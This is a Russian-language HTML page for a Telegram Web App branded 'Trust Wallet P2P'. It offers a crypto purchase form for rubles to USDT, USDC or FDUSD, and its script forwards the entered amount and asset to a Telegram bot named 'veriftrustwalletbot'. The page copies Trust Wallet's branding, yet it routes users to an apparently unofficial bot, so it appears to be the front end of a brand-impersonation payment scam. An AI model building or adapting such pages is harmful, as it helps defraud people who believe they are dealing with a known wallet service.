<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Trust Wallet P2P</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --tw-blue: #0500ff;
            --tw-bg: #ffffff;
            --tw-card: #f6f7f9;
            --tw-text: #1e2329;
            --tw-muted: #717e8f;
            --tw-border: #e1e4e8;
        }

        body {
            font-family: -apple-system, system-ui, sans-serif;
            background-color: var(--tw-bg);
            margin: 0; padding: 24px;
            display: flex; flex-direction: column;
            color: var(--tw-text);
        }

        h2 { font-size: 26px; font-weight: 800; color: var(--tw-blue); margin-top: 0; }
        .input-group {
            background: var(--tw-card);
            border-radius: 16px;
            padding: 12px 16px;
            margin-bottom: 12px;
            border: 1px solid var(--tw-border);
        }
        .label { font-size: 11px; color: var(--tw-muted); font-weight: 700; text-transform: uppercase; margin-bottom: 4px; }
        input, select { background: transparent; border: none; color: var(--tw-text); font-size: 18px; font-weight: 700; width: 100%; outline: none; }
        .btn-main { background: var(--tw-blue); color: #fff; width: 100%; padding: 18px; border-radius: 50px; font-weight: 700; border: none; font-size: 16px; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>

    <h2>Купить крипто</h2>
    
    <div class="input-group">
        <div class="label">Сумма (RUB)</div>
        <input type="number" id="rub-amount" value="10000">
    </div>

    <div class="input-group">
        <div class="label">Актив</div>
        <select id="crypto-asset">
            <option value="USDT">USDT</option>
            <option value="USDC">USDC</option>
            <option value="FDUSD">FDUSD</option>
        </select>
    </div>

    <button class="btn-main" onclick="redirectToBot()">Продолжить</button>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    function redirectToBot() {
        const amount = document.getElementById('rub-amount').value;
        const asset = document.getElementById('crypto-asset').value;

        // В Botmother параметр после start попадет в переменную start_param
        // Мы передаем данные через дефис, так как Botmother легко их распарсит
        const commandParams = `p2p-express-${amount}-${asset}`;
        
        const botUrl = `https://t.me/veriftrustwalletbot?start=${commandParams}`;

        tg.HapticFeedback.notificationOccurred('success');
        tg.openTelegramLink(botUrl);
        
        setTimeout(() => { tg.close(); }, 200);
    }
</script>
</body>
</html>
